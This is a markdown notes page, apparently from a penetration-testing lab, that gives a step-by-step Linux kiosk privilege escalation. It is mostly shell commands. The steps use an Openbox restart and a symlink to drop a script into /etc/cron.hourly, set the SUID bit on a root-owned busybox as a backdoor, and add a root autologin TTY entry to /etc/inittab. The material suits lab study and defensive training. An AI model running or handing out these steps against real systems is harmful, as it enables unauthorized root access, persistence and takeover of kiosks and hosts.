---
title: Privileged Escalation
draft: false
tags:
---
 
One approach is to leverage the _Basic Linux Privilege Escalation_ techniques outlined by [g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/).

- Locate SUID binaries.
```bash
find / -perm -u=s -exec ls -al {} +
```

- Enumerate running processes:
```bash
$ ps aux
ID   USER     TIME   COMMAND
 1    root       0:03 init [4]
 2    root       0:00 [kthreadd]
 ...
 1083 root       0:00 /usr/sbin/acpid -n
 1120 root       0:00 {xdm} /bin/sh /usr/bin/xdm
 1123 root       0:00 -bash -c /usr/bin/startx -- -nolisten tcp vt7 > /dev/null 2>&1
 1138 root       0:00 {startx} /bin/sh /usr/bin/startx -- -nolisten tcp vt7
 1186 root       0:00 xinit /etc/X11/xinit/xinitrc -- /usr/bin/X :0 -nolisten tcp vt7 -auth /root/.serverauth.1138
 1187 root       0:14 /usr/bin/X :0 -nolisten tcp vt7 -auth /root/.serverauth.1138
 1193 root       0:00 {xinitrc} /bin/sh /etc/X11/xinit/xinitrc
 1196 root       0:01 /usr/bin/openbox --startup /usr/libexec/openbox-autostart OPENBOX
 1199 root       0:00 dbus-launch --exit-with-session /usr/bin/openbox-session
 1200 root       0:00 /usr/bin/dbus-daemon --syslog --fork --print-pid 5 --print-address 7 --session
 1344 root       0:00 x11vnc -rfbauth /root/.vnc/passwd -auth /root/.serverauth.1138 -display :0 -nomodtweak -noxdamage -shared -forever -loop5000 -bg
 ...
23310 guest      0:00 ps aux | grep root
```

We can see multiple processes running by root, including ["openbox"](http://openbox.org/wiki/Main_Page), the X window manager used by the kiosk's custom interface.

Openbox supports a command-line option (**--replace**) which will replace the currently running window manager instance, without restarting the kiosk itself, which means that we wont loose changes:
```bash
$ openbox --replace
```

The interesting part is that we are able to restart Openbox which is owned by root as the guest user.

Our current Kiosk interface is Firefox, which stores the user profile folder in `/home/<user>/.mozilla/firefox/c3pp43bg.default`. When we edit files in this folder and restart firefox, Openbox recreates the firefox configuration file `/home/<user>/.mozilla/firefox/c3pp43bg.default/bookmarks.html`. 

If we delete the file and run openbox the file is created again with the low-privileged user permissions, but we know that the kiosk runs as a privileged user, so lets perform a test to write on a privileged location:

1. Backup the firefox folder:
```bash
mv /home/guest/.mozilla/firefox/c3pp43bg.default /home/guest/.mozilla/firefox/old_prof
```

2. Create a symlink to a protected folder:
```bash
ln -s /etc/cron.hourly /home/guest/.mozilla/firefox/c3pp43bg.default
```

The idea is that the script we are going to place in the protected directory is automatically executed by root.

- The scripts in the protected [**/etc/profile.d/**](http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_03_01.html) folder, all of which must have an **.sh** extension, are run at user login. If we wrote our bookmark file to that directory, and added a **.sh** extension, our terminal would run as root when that user logged in. Unfortunately, we cannot rename the file.

- The **/etc/cron.d** directory is a part of the Cron job scheduler. Any scripts placed in this folder would be run as root. However, as with **/etc/profile.d**, there is a catch. Files placed in [**/etc/cron.d**](https://unix.stackexchange.com/questions/417323/what-is-the-difference-between-cron-d-as-in-etc-cron-d-and-crontab) must be owned by the root user or they will not run. We cannot change the ownership of the file.

- Solution: certain cron directories including **/etc/cron.hourly**, **/etc/cron.daily**, **/etc/cron.weekly**, and **/etc/cron.monthly** do not have such requirements and will accept non-root-owned files.

3. Regenerate the bookmarks.html file to create the file inside the protected directory:
```bash
openbox --replace
```

4. Make the file executable:
```bash
chmod +x /etc/cron.hourly/bookmarks.html
```

5. Create a copy of the busybox executable through our gtkdialog terminal to preserve the original busybox:
```bash
cp /bin/busybox /home/guest/
```

6. Now we need to write a script into the file. We can use any editor or redirections (`>`) because gtkdialog uses bash redirect to process our command `<action>$CMDTORUN > /tmp/termout.txt</action>`. We can do a workaroud by creating a testscript.sh using Scratchpad with the following content:
```bash
echo "#!/bin/bash" > /etc/cron.hourly/bookmarks.html
echo "chown root:root /home/guest/busybox" >> /etc/cron.hourly/bookmarks.html
echo "chmod +s /home/guest/busybox" >> /etc/cron.hourly/bookmarks.html
```

This will provide us with a backdoor just in case our terminal is closed or crashes, we dont have to wait 1 hour. We will give busybox root ownership and attach the SUID bit so we can run it always as root.

6. Save the file at `/home/<user>/commands.txt` and make sure to put "All Files" and give execution permissions:
```bash
chmod +x /home/guest/commands.txt
```

7. Execute the script to write the content to the file:
```bash
./home/guest/commands.txt

# or

/bin/bash -c "/home/guest/commands.txt"

# Maybe try:
irc://myhost -f /home/guest/commands.txt
```

8. Next, we need to wait 1h until our busybox permissions are changed. After that, we will create a **runterminal.sh** script in Scratchpad that will launch our gtkdialog terminal using the root busybox:
```bash
#!/bin/bash
/usr/bin/gtkdialog -f /home/guest/terminal.txt
```

9. Execute the terminal with busybox:
```bash
/home/guest/busybox sh /home/guest/runterminal.sh
```

---
# Upgrading the Terminal

Linux systems have built-in console sessions called [TTYs](https://www.howtogeek.com/428174/what-is-a-tty-on-linux-and-how-to-use-the-tty-command/) or [virtual console/terminals](https://en.wikipedia.org/wiki/Virtual_console). This is normally accessed from a Linux desktop with the keyboard shortcuts of Ctrl+Alt+F3 through F6, with each function key presenting a different session.

We can use [**/usr/bin/xdotool**](http://linuxcommandlibrary.com/man/xdotool.html) to programmatically send keyboard shortcuts via the command line:
```bash
xdotool key Ctrl+Alt+F3
```

> [!Note]
> The command might not work, modifying this settings with root requires restart of the kiosk.

Review the **/etc/X11/xorg.conf.d/10-xorg.conf** file and check the ["DontVTSwitch"](https://help.gnome.org/admin/system-admin-guide/stable/lockdown-command-line.html.en) option. VT switching refers to the ability to switch dynamically between [virtual terminal](https://en.wikipedia.org/wiki/Virtual_console) interfaces.

1. Copy the original file to a temporary location:
```bash
cp /etc/X11/xorg.conf.d/10-xorg.conf /home/guest/xorg.txt
```

2. Modify the permissions to be able to edit the file in Scratchpad:
```bash
chmod 777 /home/guest/xorg.txt
```

> [!Note]
> Permissions from files modified by Scratchpad are updated to 0600

3. Open the copied file in Scratchpad and comment the DontVTSwitch option:
![[Pasted image 20260715215014.png]]

4. Save the file and copy it back to its original location:
```bash
cp /home/guest/xorg.txt /etc/X11/xorg.conf.d/10-xorg.conf 

chmod 644 /etc/X11/xorg.conf.d/10-xorg.conf
```

5. Restart the X session:
```bash
openbox --replace
```

Now we have to define a TTY for the system in the **/etc/inittab** file.

1. Copy the file to a temporal location:
```bash
cp /etc/inittab /home/guest/inittab.txt
```

2. Modify the permissions so we can edit the file with Scratchpad:
```bash
chmod 777 /home/guest/inittab.txt
```

3. Add a TTY by adding the following line to the "Standard console login" section under the two commented lines:
```bash
c3::respawn:/sbin/agetty --noclear --autologin root 38400 tty3 linux
```

> [!Note]
> This instructs the TTY to [automatically log in as the root user](https://wiki.gentoo.org/wiki/Automatic_login_to_virtual_console)

![[Pasted image 20260715220008.png]]

4. Save the file and copy it back to the original location:
```bash
cp /home/guest/inittab.txt /etc/inittab

chmod 600 /etc/inittab
```

5. Dynamically reload the settings [without rebooting the system](http://linuxmafia.com/faq/Admin/init.html):
```bash
/sbin/init q
```

6. Switch to a TTY terminal session:
```bash
# Physically connected at the Kiosk: 
# Run:
xdotool key Ctrl+Alt+F3


# Connected remotely through VNC:
# 1. create the following script:

#!/bin/bash
killall x11vnc 
x11vnc -rawfb vt3

# 2. give execution permissions 
$ chmod +x script.txt

# 3. run the script and reconnect
./script.txt
```

TODO: Try to determine the mechanism by which the kiosk refresh scripts are replacing **bookmarks.html**. Why does it only work when setting a symlink to a directory and not just pointing to the **bookmarks.html** file instead?

